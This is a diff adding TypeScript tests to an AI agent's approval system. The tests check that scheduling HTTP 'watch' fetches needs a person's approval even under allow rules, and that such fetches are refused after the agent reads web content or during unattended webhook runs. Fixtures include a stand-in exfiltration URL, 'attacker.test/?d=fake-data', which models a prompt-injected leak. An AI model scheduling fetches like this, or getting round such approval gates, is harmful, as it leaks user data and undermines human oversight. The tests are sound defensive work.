@@ -2646,6 +2646,91 @@ describe("bot management approvals", () => {
   });
 });
 
+describe("HTTP watch creation approval", () => {
+  beforeEach(() => reviewMock.mockReset());
+
+  it.each([false, true])(
+    "requires a person's approval for HTTP watch JSON=%s despite allow rules",
+    async (json) => {
+      const f = fixture({
+        name: "schedule_create",
+        builtin: true,
+        autoReview: true,
+        rules: [{ effect: "always_allow", matchKind: "tool", matchValue: "schedule_create" }],
+      });
+      const watch = { kind: "http", url: "https://example.com/status" };
+      f.setCalls([
+        {
+          args: {
+            name: "Check",
+            prompt: "Summarize changes",
+            watch: json ? JSON.stringify(watch) : watch,
+          },
+          executionId: "call-1",
+        },
+      ]);
+      await f.run();
+      expect(isApprovalPausedResult(f.results[0])).toBe(true);
+      expect(reviewMock).not.toHaveBeenCalled();
+      expect(pausedActionIds(f)).toEqual(["allow", "deny"]);
+    },
+  );
+
+  it.each(["user", "routine"])(
+    "does not let a %s run schedule HTTP requests after reading outside content",
+    async (trigger) => {
+      const f = fixture({
+        builtin: true,
+        sourceRole: "user",
+        trigger,
+        autoReview: true,
+        rules: [{ effect: "always_allow", matchKind: "tool", matchValue: "schedule_create" }],
+      });
+      f.setCalls([
+        { name: "web_search", args: { query: "news" }, executionId: "call-1" },
+        {
+          name: "schedule_create",
+          args: {
+            name: "Check",
+            prompt: "Summarize changes",
+            watch: { kind: "http", url: "https://attacker.test/?d=fake-data" },
+          },
+          executionId: "call-2",
+        },
+      ]);
+      await f.run();
+      expect(isApprovalPausedResult(f.results[1])).toBe(true);
+      expect(reviewMock).not.toHaveBeenCalled();
+      expect(pausedActionIds(f)).toEqual(["allow", "deny"]);
+    },
+  );
+  it("refuses a new HTTP-watch destination in an unattended webhook run", async () => {
+    const f = fixture({
+      name: "schedule_create",
+      builtin: true,
+      trigger: "webhook",
+      autoReview: true,
+    });
+    f.setCalls([
+      {
+        args: {
+          name: "Check",
+          prompt: "Summarize changes",
+          watch: { kind: "http", url: "https://attacker.test/status" },
+        },
+        executionId: "call-1",
+      },
+    ]);
+    await f.run();
+    expect(f.results[0]).toEqual({
+      error: "Fetching attacker.test needs approval, and a webhook run cannot ask.",
+    });
+    expect(reviewMock).not.toHaveBeenCalled();
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+    expect(f.effects.map((effect) => effect.status)).toEqual(["denied"]);
+  });
+});
+
 describe("command watch creation approval", () => {
   beforeEach(() => reviewMock.mockReset());
   it.each([false, true])(
